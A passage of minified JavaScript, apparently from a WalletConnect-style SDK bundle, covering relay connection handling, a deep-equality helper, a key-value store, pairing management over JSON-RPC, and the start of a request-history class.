                        await this.subscriber.start().then(ws).catch(ms).finally( () => {
                            this.provider.off(L.disconnect, Es)
                        }
                        )
                    }
                    ),
                    this.hasExperiencedNetworkDisruption = !1,
                    oe()
                }
                )
            } catch (oe) {
                await this.subscriber.stop();
                const et = oe;
                this.logger.warn({}, et.message),
                this.hasExperiencedNetworkDisruption = !0
            } finally {
                this.connectionAttemptInProgress = !1
            }
            if (this.connected) {
                this.logger.debug({}, `Connected to ${this.relayUrl} successfully on attempt: ${Z}`);
                break
            }
            await new Promise(oe => setTimeout(oe, cjs$3.toMiliseconds(Z * 1))),
            Z++
        }
    }
    startPingTimeout() {
        var U, Z, oe, et, st;
        if (Ye$1())
            try {
                (Z = (U = this.provider) == null ? void 0 : U.connection) != null && Z.socket && ((st = (et = (oe = this.provider) == null ? void 0 : oe.connection) == null ? void 0 : et.socket) == null || st.on("ping", () => {
                    this.resetPingTimeout()
                }
                )),
                this.resetPingTimeout()
            } catch (ws) {
                this.logger.warn(ws, ws == null ? void 0 : ws.message)
            }
    }
    async createProvider() {
        this.provider.connection && this.unregisterProviderListeners();
        const U = await this.core.crypto.signJWT(this.relayUrl);
        this.provider = new o(new f$2(zs({
            sdkVersion: _e$1,
            protocol: this.protocol,
            version: this.version,
            relayUrl: this.relayUrl,
            projectId: this.projectId,
            auth: U,
            useOnCloseEvent: !0,
            bundleId: this.bundleId,
            packageName: this.packageName
        }))),
        this.registerProviderListeners()
    }
    async recordMessageEvent(U, Z) {
        const {topic: oe, message: et} = U;
        await this.messages.set(oe, et, Z)
    }
    async shouldIgnoreMessageEvent(U) {
        const {topic: Z, message: oe} = U;
        if (!oe || oe.length === 0)
            return this.logger.warn(`Ignoring invalid/empty message: ${oe}`),
            !0;
        if (!await this.subscriber.isKnownTopic(Z))
            return this.logger.warn(`Ignoring message for unknown topic ${Z}`),
            !0;
        const et = this.messages.has(Z, oe);
        return et && this.logger.warn(`Ignoring duplicate message: ${oe}`),
        et
    }
    async onProviderPayload(U) {
        if (this.logger.debug("Incoming Relay Payload"),
        this.logger.trace({
            type: "payload",
            direction: "incoming",
            payload: U
        }),
        isJsonRpcRequest(U)) {
            if (!U.method.endsWith(zt))
                return;
            const Z = U.params
              , {topic: oe, message: et, publishedAt: st, attestation: ws} = Z.data
              , ms = {
                topic: oe,
                message: et,
                publishedAt: st,
                transportType: Q.relay,
                attestation: ws
            };
            this.logger.debug("Emitting Relayer Payload"),
            this.logger.trace(Si({
                type: "event",
                event: Z.id
            }, ms)),
            this.events.emit(Z.id, ms),
            await this.acknowledgePayload(U),
            await this.onMessageEvent(ms)
        } else
            isJsonRpcResponse(U) && this.events.emit(C.message_ack, U)
    }
    async onMessageEvent(U) {
        await this.shouldIgnoreMessageEvent(U) || (await this.recordMessageEvent(U, le.inbound),
        this.events.emit(C.message, U))
    }
    async acknowledgePayload(U) {
        const Z = formatJsonRpcResult(U.id, !0);
        await this.provider.connection.send(Z)
    }
    unregisterProviderListeners() {
        this.provider.off(L.payload, this.onPayloadHandler),
        this.provider.off(L.connect, this.onConnectHandler),
        this.provider.off(L.disconnect, this.onDisconnectHandler),
        this.provider.off(L.error, this.onProviderErrorHandler),
        clearTimeout(this.pingTimeout)
    }
    async registerEventListeners() {
        let U = await ja();
        ka(async Z => {
            U !== Z && (U = Z,
            Z ? await this.transportOpen().catch(oe => this.logger.error(oe, oe == null ? void 0 : oe.message)) : (this.hasExperiencedNetworkDisruption = !0,
            await this.transportDisconnect(),
            this.transportExplicitlyClosed = !1))
        }
        ),
        this.core.heartbeat.on(r$1.pulse, async () => {
            if (!this.transportExplicitlyClosed && !this.connected && Pa())
                try {
                    await this.confirmOnlineStateOrThrow(),
                    await this.transportOpen()
                } catch (Z) {
                    this.logger.warn(Z, Z == null ? void 0 : Z.message)
                }
        }
        )
    }
    async onProviderDisconnect() {
        clearTimeout(this.pingTimeout),
        this.events.emit(C.disconnect),
        this.connectionAttemptInProgress = !1,
        !this.reconnectInProgress && (this.reconnectInProgress = !0,
        await this.subscriber.stop(),
        this.subscriber.hasAnyTopics && (this.transportExplicitlyClosed || (this.reconnectTimeout = setTimeout(async () => {
            await this.transportOpen().catch(U => this.logger.error(U, U == null ? void 0 : U.message)),
            this.reconnectTimeout = void 0,
            this.reconnectInProgress = !1
        }
        , cjs$3.toMiliseconds(Lt)))))
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: U} = Et$2("NOT_INITIALIZED", this.name);
            throw new Error(U)
        }
    }
    async toEstablishConnection() {
        if (await this.confirmOnlineStateOrThrow(),
        !this.connected) {
            if (this.connectPromise) {
                await this.connectPromise;
                return
            }
            await this.connect()
        }
    }
}
function ro(q, U) {
    return q === U || Number.isNaN(q) && Number.isNaN(U)
}
function Ri(q) {
    return Object.getOwnPropertySymbols(q).filter(U => Object.prototype.propertyIsEnumerable.call(q, U))
}
function Ai(q) {
    return q == null ? q === void 0 ? "[object Undefined]" : "[object Null]" : Object.prototype.toString.call(q)
}
const no = "[object RegExp]"
  , oo = "[object String]"
  , ao = "[object Number]"
  , co = "[object Boolean]"
  , xi = "[object Arguments]"
  , ho = "[object Symbol]"
  , lo = "[object Date]"
  , uo = "[object Map]"
  , go = "[object Set]"
  , po = "[object Array]"
  , yo = "[object Function]"
  , bo = "[object ArrayBuffer]"
  , Je = "[object Object]"
  , mo = "[object Error]"
  , fo = "[object DataView]"
  , Do = "[object Uint8Array]"
  , vo = "[object Uint8ClampedArray]"
  , wo = "[object Uint16Array]"
  , _o = "[object Uint32Array]"
  , Eo = "[object BigUint64Array]"
  , Io = "[object Int8Array]"
  , To = "[object Int16Array]"
  , Co = "[object Int32Array]"
  , Po = "[object BigInt64Array]"
  , So = "[object Float32Array]"
  , Oo = "[object Float64Array]";
function Ro() {}
function Ni(q) {
    if (!q || typeof q != "object")
        return !1;
    const U = Object.getPrototypeOf(q);
    return U === null || U === Object.prototype || Object.getPrototypeOf(U) === null ? Object.prototype.toString.call(q) === "[object Object]" : !1
}
function Ao(q, U, Z) {
    return pe(q, U, void 0, void 0, void 0, void 0, Z)
}
function pe(q, U, Z, oe, et, st, ws) {
    const ms = ws(q, U, Z, oe, et, st);
    if (ms !== void 0)
        return ms;
    if (typeof q == typeof U)
        switch (typeof q) {
        case "bigint":
        case "string":
        case "boolean":
        case "symbol":
        case "undefined":
            return q === U;
        case "number":
            return q === U || Object.is(q, U);
        case "function":
            return q === U;
        case "object":
            return ye(q, U, st, ws)
        }
    return ye(q, U, st, ws)
}
function ye(q, U, Z, oe) {
    if (Object.is(q, U))
        return !0;
    let et = Ai(q)
      , st = Ai(U);
    if (et === xi && (et = Je),
    st === xi && (st = Je),
    et !== st)
        return !1;
    switch (et) {
    case oo:
        return q.toString() === U.toString();
    case ao:
        {
            const Es = q.valueOf()
              , vs = U.valueOf();
            return ro(Es, vs)
        }
    case co:
    case lo:
    case ho:
        return Object.is(q.valueOf(), U.valueOf());
    case no:
        return q.source === U.source && q.flags === U.flags;
    case yo:
        return q === U
    }
    Z = Z ?? new Map;
    const ws = Z.get(q)
      , ms = Z.get(U);
    if (ws != null && ms != null)
        return ws === U;
    Z.set(q, U),
    Z.set(U, q);
    try {
        switch (et) {
        case uo:
            {
                if (q.size !== U.size)
                    return !1;
                for (const [Es,vs] of q.entries())
                    if (!U.has(Es) || !pe(vs, U.get(Es), Es, q, U, Z, oe))
                        return !1;
                return !0
            }
        case go:
            {
                if (q.size !== U.size)
                    return !1;
                const Es = Array.from(q.values())
                  , vs = Array.from(U.values());
                for (let _s = 0; _s < Es.length; _s++) {
                    const Is = Es[_s]
                      , Ss = vs.findIndex(Ts => pe(Is, Ts, void 0, q, U, Z, oe));
                    if (Ss === -1)
                        return !1;
                    vs.splice(Ss, 1)
                }
                return !0
            }
        case po:
        case Do:
        case vo:
        case wo:
        case _o:
        case Eo:
        case Io:
        case To:
        case Co:
        case Po:
        case So:
        case Oo:
            {
                if (typeof Buffer < "u" && Buffer.isBuffer(q) !== Buffer.isBuffer(U) || q.length !== U.length)
                    return !1;
                for (let Es = 0; Es < q.length; Es++)
                    if (!pe(q[Es], U[Es], Es, q, U, Z, oe))
                        return !1;
                return !0
            }
        case bo:
            return q.byteLength !== U.byteLength ? !1 : ye(new Uint8Array(q), new Uint8Array(U), Z, oe);
        case fo:
            return q.byteLength !== U.byteLength || q.byteOffset !== U.byteOffset ? !1 : ye(new Uint8Array(q), new Uint8Array(U), Z, oe);
        case mo:
            return q.name === U.name && q.message === U.message;
        case Je:
            {
                if (!(ye(q.constructor, U.constructor, Z, oe) || Ni(q) && Ni(U)))
                    return !1;
                const Es = [...Object.keys(q), ...Ri(q)]
                  , vs = [...Object.keys(U), ...Ri(U)];
                if (Es.length !== vs.length)
                    return !1;
                for (let _s = 0; _s < Es.length; _s++) {
                    const Is = Es[_s]
                      , Ss = q[Is];
                    if (!Object.hasOwn(U, Is))
                        return !1;
                    const Ts = U[Is];
                    if (!pe(Ss, Ts, Is, q, U, Z, oe))
                        return !1
                }
                return !0
            }
        default:
            return !1
        }
    } finally {
        Z.delete(q),
        Z.delete(U)
    }
}
function xo(q, U) {
    return Ao(q, U, Ro)
}
var No = Object.defineProperty
  , $i = Object.getOwnPropertySymbols
  , $o = Object.prototype.hasOwnProperty
  , zo = Object.prototype.propertyIsEnumerable
  , Xe = (q, U, Z) => U in q ? No(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , zi = (q, U) => {
    for (var Z in U || (U = {}))
        $o.call(U, Z) && Xe(q, Z, U[Z]);
    if ($i)
        for (var Z of $i(U))
            zo.call(U, Z) && Xe(q, Z, U[Z]);
    return q
}
  , z = (q, U, Z) => Xe(q, typeof U != "symbol" ? U + "" : U, Z);
class Li extends f$3 {
    constructor(U, Z, oe, et=B, st=void 0) {
        super(U, Z, oe, et),
        this.core = U,
        this.logger = Z,
        this.name = oe,
        z(this, "map", new Map),
        z(this, "version", kt),
        z(this, "cached", []),
        z(this, "initialized", !1),
        z(this, "getKey"),
        z(this, "storagePrefix", B),
        z(this, "recentlyDeleted", []),
        z(this, "recentlyDeletedLimit", 200),
        z(this, "init", async () => {
            this.initialized || (this.logger.trace("Initialized"),
            await this.restore(),
            this.cached.forEach(ws => {
                this.getKey && ws !== null && !kt$1(ws) ? this.map.set(this.getKey(ws), ws) : wa(ws) ? this.map.set(ws.id, ws) : xa(ws) && this.map.set(ws.topic, ws)
            }
            ),
            this.cached = [],
            this.initialized = !0)
        }
        ),
        z(this, "set", async (ws, ms) => {
            this.isInitialized(),
            this.map.has(ws) ? await this.update(ws, ms) : (this.logger.debug("Setting value"),
            this.logger.trace({
                type: "method",
                method: "set",
                key: ws,
                value: ms
            }),
            this.map.set(ws, ms),
            await this.persist())
        }
        ),
        z(this, "get", ws => (this.isInitialized(),
        this.logger.debug("Getting value"),
        this.logger.trace({
            type: "method",
            method: "get",
            key: ws
        }),
        this.getData(ws))),
        z(this, "getAll", ws => (this.isInitialized(),
        ws ? this.values.filter(ms => Object.keys(ws).every(Es => xo(ms[Es], ws[Es]))) : this.values)),
        z(this, "update", async (ws, ms) => {
            this.isInitialized(),
            this.logger.debug("Updating value"),
            this.logger.trace({
                type: "method",
                method: "update",
                key: ws,
                update: ms
            });
            const Es = zi(zi({}, this.getData(ws)), ms);
            this.map.set(ws, Es),
            await this.persist()
        }
        ),
        z(this, "delete", async (ws, ms) => {
            this.isInitialized(),
            this.map.has(ws) && (this.logger.debug("Deleting value"),
            this.logger.trace({
                type: "method",
                method: "delete",
                key: ws,
                reason: ms
            }),
            this.map.delete(ws),
            this.addToRecentlyDeleted(ws),
            await this.persist())
        }
        ),
        this.logger = E$1(Z, this.name),
        this.storagePrefix = et,
        this.getKey = st
    }
    get context() {
        return y$2(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
    }
    get length() {
        return this.map.size
    }
    get keys() {
        return Array.from(this.map.keys())
    }
    get values() {
        return Array.from(this.map.values())
    }
    addToRecentlyDeleted(U) {
        this.recentlyDeleted.push(U),
        this.recentlyDeleted.length >= this.recentlyDeletedLimit && this.recentlyDeleted.splice(0, this.recentlyDeletedLimit / 2)
    }
    async setDataStore(U) {
        await this.core.storage.setItem(this.storageKey, U)
    }
    async getDataStore() {
        return await this.core.storage.getItem(this.storageKey)
    }
    getData(U) {
        const Z = this.map.get(U);
        if (!Z) {
            if (this.recentlyDeleted.includes(U)) {
                const {message: et} = Et$2("MISSING_OR_INVALID", `Record was recently deleted - ${this.name}: ${U}`);
                throw this.logger.error(et),
                new Error(et)
            }
            const {message: oe} = Et$2("NO_MATCHING_KEY", `${this.name}: ${U}`);
            throw this.logger.error(oe),
            new Error(oe)
        }
        return Z
    }
    async persist() {
        await this.setDataStore(this.values)
    }
    async restore() {
        try {
            const U = await this.getDataStore();
            if (typeof U > "u" || !U.length)
                return;
            if (this.map.size) {
                const {message: Z} = Et$2("RESTORE_WILL_OVERRIDE", this.name);
                throw this.logger.error(Z),
                new Error(Z)
            }
            this.cached = U,
            this.logger.debug(`Successfully Restored value for ${this.name}`),
            this.logger.trace({
                type: "method",
                method: "restore",
                value: this.values
            })
        } catch (U) {
            this.logger.debug(`Failed to Restore value for ${this.name}`),
            this.logger.error(U)
        }
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: U} = Et$2("NOT_INITIALIZED", this.name);
            throw new Error(U)
        }
    }
}
var Lo = Object.defineProperty
  , ko = (q, U, Z) => U in q ? Lo(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , p = (q, U, Z) => ko(q, typeof U != "symbol" ? U + "" : U, Z);
class ki {
    constructor(U, Z) {
        this.core = U,
        this.logger = Z,
        p(this, "name", Mt),
        p(this, "version", Kt),
        p(this, "events", new gs$1),
        p(this, "pairings"),
        p(this, "initialized", !1),
        p(this, "storagePrefix", B),
        p(this, "ignoredPayloadTypes", [ee]),
        p(this, "registeredMethods", []),
        p(this, "init", async () => {
            this.initialized || (await this.pairings.init(),
            await this.cleanup(),
            this.registerRelayerEvents(),
            this.registerExpirerEvents(),
            this.initialized = !0,
            this.logger.trace("Initialized"))
        }
        ),
        p(this, "register", ({methods: oe}) => {
            this.isInitialized(),
            this.registeredMethods = [...new Set([...this.registeredMethods, ...oe])]
        }
        ),
        p(this, "create", async oe => {
            this.isInitialized();
            const et = qc()
              , st = await this.core.crypto.setSymKey(et)
              , ws = ii$1(cjs$3.FIVE_MINUTES)
              , ms = {
                protocol: xt
            }
              , Es = {
                topic: st,
                expiry: ws,
                relay: ms,
                active: !1,
                methods: oe == null ? void 0 : oe.methods
            }
              , vs = oa({
                protocol: this.core.protocol,
                version: this.core.version,
                topic: st,
                symKey: et,
                relay: ms,
                expiryTimestamp: ws,
                methods: oe == null ? void 0 : oe.methods
            });
            return this.events.emit(re.create, Es),
            this.core.expirer.set(st, ws),
            await this.pairings.set(st, Es),
            await this.core.relayer.subscribe(st, {
                transportType: oe == null ? void 0 : oe.transportType
            }),
            {
                topic: st,
                uri: vs
            }
        }
        ),
        p(this, "pair", async oe => {
            this.isInitialized();
            const et = this.core.eventClient.createEvent({
                properties: {
                    topic: oe == null ? void 0 : oe.uri,
                    trace: [G.pairing_started]
                }
            });
            this.isValidPair(oe, et);
            const {topic: st, symKey: ws, relay: ms, expiryTimestamp: Es, methods: vs} = ra(oe.uri);
            et.props.properties.topic = st,
            et.addTrace(G.pairing_uri_validation_success),
            et.addTrace(G.pairing_uri_not_expired);
            let _s;
            if (this.pairings.keys.includes(st)) {
                if (_s = this.pairings.get(st),
                et.addTrace(G.existing_pairing),
                _s.active)
                    throw et.setError(Y.active_pairing_already_exists),
                    new Error(`Pairing already exists: ${st}. Please try again with a new connection URI.`);
                et.addTrace(G.pairing_not_expired)
            }
            const Is = Es || ii$1(cjs$3.FIVE_MINUTES)
              , Ss = {
                topic: st,
                relay: ms,
                expiry: Is,
                active: !1,
                methods: vs
            };
            this.core.expirer.set(st, Is),
            await this.pairings.set(st, Ss),
            et.addTrace(G.store_new_pairing),
            oe.activatePairing && await this.activate({
                topic: st
            }),
            this.events.emit(re.create, Ss),
            et.addTrace(G.emit_inactive_pairing),
            this.core.crypto.keychain.has(st) || await this.core.crypto.setSymKey(ws, st),
            et.addTrace(G.subscribing_pairing_topic);
            try {
                await this.core.relayer.confirmOnlineStateOrThrow()
            } catch {
                et.setError(Y.no_internet_connection)
            }
            try {
                await this.core.relayer.subscribe(st, {
                    relay: ms
                })
            } catch (Ts) {
                throw et.setError(Y.subscribe_pairing_topic_failure),
                Ts
            }
            return et.addTrace(G.subscribe_pairing_topic_success),
            Ss
        }
        ),
        p(this, "activate", async ({topic: oe}) => {
            this.isInitialized();
            const et = ii$1(cjs$3.FIVE_MINUTES);
            this.core.expirer.set(oe, et),
            await this.pairings.update(oe, {
                active: !0,
                expiry: et
            })
        }
        ),
        p(this, "ping", async oe => {
            this.isInitialized(),
            await this.isValidPing(oe),
            this.logger.warn("ping() is deprecated and will be removed in the next major release.");
            const {topic: et} = oe;
            if (this.pairings.keys.includes(et)) {
                const st = await this.sendRequest(et, "wc_pairingPing", {})
                  , {done: ws, resolve: ms, reject: Es} = ei$1();
                this.events.once(ci$1("pairing_ping", st), ({error: vs}) => {
                    vs ? Es(vs) : ms()
                }
                ),
                await ws()
            }
        }
        ),
        p(this, "updateExpiry", async ({topic: oe, expiry: et}) => {
            this.isInitialized(),
            await this.pairings.update(oe, {
                expiry: et
            })
        }
        ),
        p(this, "updateMetadata", async ({topic: oe, metadata: et}) => {
            this.isInitialized(),
            await this.pairings.update(oe, {
                peerMetadata: et
            })
        }
        ),
        p(this, "getPairings", () => (this.isInitialized(),
        this.pairings.values)),
        p(this, "disconnect", async oe => {
            this.isInitialized(),
            await this.isValidDisconnect(oe);
            const {topic: et} = oe;
            this.pairings.keys.includes(et) && (await this.sendRequest(et, "wc_pairingDelete", Kt$1("USER_DISCONNECTED")),
            await this.deletePairing(et))
        }
        ),
        p(this, "formatUriFromPairing", oe => {
            this.isInitialized();
            const {topic: et, relay: st, expiry: ws, methods: ms} = oe
              , Es = this.core.crypto.keychain.get(et);
            return oa({
                protocol: this.core.protocol,
                version: this.core.version,
                topic: et,
                symKey: Es,
                relay: st,
                expiryTimestamp: ws,
                methods: ms
            })
        }
        ),
        p(this, "sendRequest", async (oe, et, st) => {
            const ws = formatJsonRpcRequest(et, st)
              , ms = await this.core.crypto.encode(oe, ws)
              , Es = se[et].req;
            return this.core.history.set(oe, ws),
            this.core.relayer.publish(oe, ms, Es),
            ws.id
        }
        ),
        p(this, "sendResult", async (oe, et, st) => {
            const ws = formatJsonRpcResult(oe, st)
              , ms = await this.core.crypto.encode(et, ws)
              , Es = (await this.core.history.get(et, oe)).request.method
              , vs = se[Es].res;
            await this.core.relayer.publish(et, ms, vs),
            await this.core.history.resolve(ws)
        }
        ),
        p(this, "sendError", async (oe, et, st) => {
            const ws = formatJsonRpcError(oe, st)
              , ms = await this.core.crypto.encode(et, ws)
              , Es = (await this.core.history.get(et, oe)).request.method
              , vs = se[Es] ? se[Es].res : se.unregistered_method.res;
            await this.core.relayer.publish(et, ms, vs),
            await this.core.history.resolve(ws)
        }
        ),
        p(this, "deletePairing", async (oe, et) => {
            await this.core.relayer.unsubscribe(oe),
            await Promise.all([this.pairings.delete(oe, Kt$1("USER_DISCONNECTED")), this.core.crypto.deleteSymKey(oe), et ? Promise.resolve() : this.core.expirer.del(oe)])
        }
        ),
        p(this, "cleanup", async () => {
            const oe = this.pairings.getAll().filter(et => fi$1(et.expiry));
            await Promise.all(oe.map(et => this.deletePairing(et.topic)))
        }
        ),
        p(this, "onRelayEventRequest", async oe => {
            const {topic: et, payload: st} = oe;
            switch (st.method) {
            case "wc_pairingPing":
                return await this.onPairingPingRequest(et, st);
            case "wc_pairingDelete":
                return await this.onPairingDeleteRequest(et, st);
            default:
                return await this.onUnknownRpcMethodRequest(et, st)
            }
        }
        ),
        p(this, "onRelayEventResponse", async oe => {
            const {topic: et, payload: st} = oe
              , ws = (await this.core.history.get(et, st.id)).request.method;
            switch (ws) {
            case "wc_pairingPing":
                return this.onPairingPingResponse(et, st);
            default:
                return this.onUnknownRpcMethodResponse(ws)
            }
        }
        ),
        p(this, "onPairingPingRequest", async (oe, et) => {
            const {id: st} = et;
            try {
                this.isValidPing({
                    topic: oe
                }),
                await this.sendResult(st, oe, !0),
                this.events.emit(re.ping, {
                    id: st,
                    topic: oe
                })
            } catch (ws) {
                await this.sendError(st, oe, ws),
                this.logger.error(ws)
            }
        }
        ),
        p(this, "onPairingPingResponse", (oe, et) => {
            const {id: st} = et;
            setTimeout( () => {
                isJsonRpcResult(et) ? this.events.emit(ci$1("pairing_ping", st), {}) : isJsonRpcError(et) && this.events.emit(ci$1("pairing_ping", st), {
                    error: et.error
                })
            }
            , 500)
        }
        ),
        p(this, "onPairingDeleteRequest", async (oe, et) => {
            const {id: st} = et;
            try {
                this.isValidDisconnect({
                    topic: oe
                }),
                await this.deletePairing(oe),
                this.events.emit(re.delete, {
                    id: st,
                    topic: oe
                })
            } catch (ws) {
                await this.sendError(st, oe, ws),
                this.logger.error(ws)
            }
        }
        ),
        p(this, "onUnknownRpcMethodRequest", async (oe, et) => {
            const {id: st, method: ws} = et;
            try {
                if (this.registeredMethods.includes(ws))
                    return;
                const ms = Kt$1("WC_METHOD_UNSUPPORTED", ws);
                await this.sendError(st, oe, ms),
                this.logger.error(ms)
            } catch (ms) {
                await this.sendError(st, oe, ms),
                this.logger.error(ms)
            }
        }
        ),
        p(this, "onUnknownRpcMethodResponse", oe => {
            this.registeredMethods.includes(oe) || this.logger.error(Kt$1("WC_METHOD_UNSUPPORTED", oe))
        }
        ),
        p(this, "isValidPair", (oe, et) => {
            var st;
            if (!Aa(oe)) {
                const {message: ms} = Et$2("MISSING_OR_INVALID", `pair() params: ${oe}`);
                throw et.setError(Y.malformed_pairing_uri),
                new Error(ms)
            }
            if (!ma(oe.uri)) {
                const {message: ms} = Et$2("MISSING_OR_INVALID", `pair() uri: ${oe.uri}`);
                throw et.setError(Y.malformed_pairing_uri),
                new Error(ms)
            }
            const ws = ra(oe == null ? void 0 : oe.uri);
            if (!((st = ws == null ? void 0 : ws.relay) != null && st.protocol)) {
                const {message: ms} = Et$2("MISSING_OR_INVALID", "pair() uri#relay-protocol");
                throw et.setError(Y.malformed_pairing_uri),
                new Error(ms)
            }
            if (!(ws != null && ws.symKey)) {
                const {message: ms} = Et$2("MISSING_OR_INVALID", "pair() uri#symKey");
                throw et.setError(Y.malformed_pairing_uri),
                new Error(ms)
            }
            if (ws != null && ws.expiryTimestamp && cjs$3.toMiliseconds(ws == null ? void 0 : ws.expiryTimestamp) < Date.now()) {
                et.setError(Y.pairing_expired);
                const {message: ms} = Et$2("EXPIRED", "pair() URI has expired. Please try again with a new connection URI.");
                throw new Error(ms)
            }
        }
        ),
        p(this, "isValidPing", async oe => {
            if (!Aa(oe)) {
                const {message: st} = Et$2("MISSING_OR_INVALID", `ping() params: ${oe}`);
                throw new Error(st)
            }
            const {topic: et} = oe;
            await this.isValidPairingTopic(et)
        }
        ),
        p(this, "isValidDisconnect", async oe => {
            if (!Aa(oe)) {
                const {message: st} = Et$2("MISSING_OR_INVALID", `disconnect() params: ${oe}`);
                throw new Error(st)
            }
            const {topic: et} = oe;
            await this.isValidPairingTopic(et)
        }
        ),
        p(this, "isValidPairingTopic", async oe => {
            if (!it(oe, !1)) {
                const {message: et} = Et$2("MISSING_OR_INVALID", `pairing topic should be a string: ${oe}`);
                throw new Error(et)
            }
            if (!this.pairings.keys.includes(oe)) {
                const {message: et} = Et$2("NO_MATCHING_KEY", `pairing topic doesn't exist: ${oe}`);
                throw new Error(et)
            }
            if (fi$1(this.pairings.get(oe).expiry)) {
                await this.deletePairing(oe);
                const {message: et} = Et$2("EXPIRED", `pairing topic: ${oe}`);
                throw new Error(et)
            }
        }
        ),
        this.core = U,
        this.logger = E$1(Z, this.name),
        this.pairings = new Li(this.core,this.logger,this.name,this.storagePrefix)
    }
    get context() {
        return y$2(this.logger)
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: U} = Et$2("NOT_INITIALIZED", this.name);
            throw new Error(U)
        }
    }
    registerRelayerEvents() {
        this.core.relayer.on(C.message, async U => {
            const {topic: Z, message: oe, transportType: et} = U;
            if (this.pairings.keys.includes(Z) && et !== Q.link_mode && !this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(oe)))
                try {
                    const st = await this.core.crypto.decode(Z, oe);
                    isJsonRpcRequest(st) ? (this.core.history.set(Z, st),
                    await this.onRelayEventRequest({
                        topic: Z,
                        payload: st
                    })) : isJsonRpcResponse(st) && (await this.core.history.resolve(st),
                    await this.onRelayEventResponse({
                        topic: Z,
                        payload: st
                    }),
                    this.core.history.delete(Z, st.id)),
                    await this.core.relayer.messages.ack(Z, oe)
                } catch (st) {
                    this.logger.error(st)
                }
        }
        )
    }
    registerExpirerEvents() {
        this.core.expirer.on(M.expired, async U => {
            const {topic: Z} = si$1(U.target);
            Z && this.pairings.keys.includes(Z) && (await this.deletePairing(Z, !0),
            this.events.emit(re.expire, {
                topic: Z
            }))
        }
        )
    }
}
var jo = Object.defineProperty
  , Uo = (q, U, Z) => U in q ? jo(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , O = (q, U, Z) => Uo(q, typeof U != "symbol" ? U + "" : U, Z);
class ji extends I$1 {
    constructor(U, Z) {
        super(U, Z),
        this.core = U,
        this.logger = Z,
        O(this, "records", new Map),
        O(this, "events", new eventsExports.EventEmitter),
        O(this, "name", Bt),
        O(this, "version", Vt),
        O(this, "cached", []),
        O(this, "initialized", !1),
        O(this, "storagePrefix", B),
        O(this, "init", async () => {
            this.initialized || (this.logger.trace("Initialized"),
            await this.restore(),
            this.cached.forEach(oe => this.records.set(oe.id, oe)),
            this.cached = [],
            this.registerEventListeners(),
            this.initialized = !0)
        }
        ),
        O(this, "set", (oe, et, st) => {
            if (this.isInitialized(),
            this.logger.debug("Setting JSON-RPC request history record"),
            this.logger.trace({
                type: "method",
                method: "set",
                topic: oe,
                request: et,
                chainId: st
            }),
            this.records.has(et.id))
                return;
            const ws = {
                id: et.id,
                topic: oe,
                request: {
                    method: et.method,
                    params: et.params || null
                },
                chainId: st,
                expiry: ii$1(cjs$3.THIRTY_DAYS)
            };
            this.records.set(ws.id, ws),
            this.persist(),
            this.events.emit(F.created, ws)
        }
        ),
        O(this, "resolve", async oe => {
            if (this.isInitialized(),
            this.logger.debug("Updating JSON-RPC response history record"),
            this.logger.trace({
                type: "method",
                method: "update",
                response: oe
            }),
            !this.records.has(oe.id))
                return;
            const et = await this.getRecord(oe.id);
            typeof et.response > "u" && (et.response = isJsonRpcError(oe) ? {
                error: oe.error
            } : {
                result: oe.result
            },
            this.records.set(et.id, et),
            this.persist(),
            this.events.emit(F.updated, et))
        }
        ),
        O(this, "get", async (oe, et) => (this.isInitialized(),
        this.logger.debug("Getting record"),
        this.logger.trace({
            type: "method",
            method: "get",
            topic: oe,
            id: et
        }),
        await this.getRecord(et))),
        O(this, "delete", (oe, et) => {
            this.isInitialized(),
            this.logger.debug("Deleting record"),
            this.logger.trace({
                type: "method",
                method: "delete",
                id: et
            }),
            this.values.forEach(st => {
                if (st.topic === oe) {
                    if (typeof et < "u" && st.id !== et)
                        return;
                    this.records.delete(st.id),
                    this.events.emit(F.deleted, st)
                }
            }
            ),
            this.persist()
        }
        ),
        O(this, "exists", async (oe, et) => (this.isInitialized(),
        this.records.has(et) ? (await this.getRecord(et)).topic === oe : !1)),
        O(this, "on", (oe, et) => {
            this.events.on(oe, et)
        }
        ),
        O(this, "once", (oe, et) => {
            this.events.once(oe, et)
        }
        ),
        O(this, "off", (oe, et) => {
            this.events.off(oe, et)
        }
        ),
        O(this, "removeListener", (oe, et) => {
            this.events.removeListener(oe, et)
        }
        ),
        this.logger = E$1(Z, this.name)
    }
    get context() {
        return y$2(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
    }
    get size() {
        return this.records.size
    }
    get keys() {
        return Array.from(this.records.keys())
    }
    get values() {
        return Array.from(this.records.values())
    }
    get pending() {
        const U = [];
        return this.values.forEach(Z => {
            if (typeof Z.response < "u")
                return;
            const oe = {
                topic: Z.topic,
                request: formatJsonRpcRequest(Z.request.method, Z.request.params, Z.id),
                chainId: Z.chainId
            };
            return U.push(oe)
        }
        ),
        U
    }
    async setJsonRpcRecords(U) {
        await this.core.storage.setItem(this.storageKey, U)
    }
    async getJsonRpcRecords() {
        return await this.core.storage.getItem(this.storageKey)
    }
    getRecord(U) {
        this.isInitialized();
        const Z = this.records.get(U);
        if (!Z) {
            const {message: oe} = Et$2("NO_MATCHING_KEY", `${this.name}: ${U}`);
            throw new Error(oe)
        }
        return Z
    }
    async persist() {
        await this.setJsonRpcRecords(this.values),
        this.events.emit(F.sync)
    }
    async restore() {
        try {
            const U = await this.getJsonRpcRecords();
            if (typeof U > "u" || !U.length)
                return;
            if (this.records.size) {
                const {message: Z} = Et$2("RESTORE_WILL_OVERRIDE", this.name);
                throw this.logger.error(Z),
                new Error(Z)
            }
            this.cached = U,
            this.logger.debug(`Successfully Restored records for ${this.name}`),
            this.logger.trace({
                type: "method",
                method: "restore",
                records: this.values
            })
        } catch (U) {
            this.logger.debug(`Failed to Restore records for ${this.name}`),
            this.logger.error(U)
        }
    }
    registerEventListeners() {
        this.events.on(F.created, U => {
            const Z = F.created;
            this.logger.info(`Emitting ${Z}`),
            this.logger.debug({
                type: "event",
                event: Z,
                record: U
            })
        }
        ),
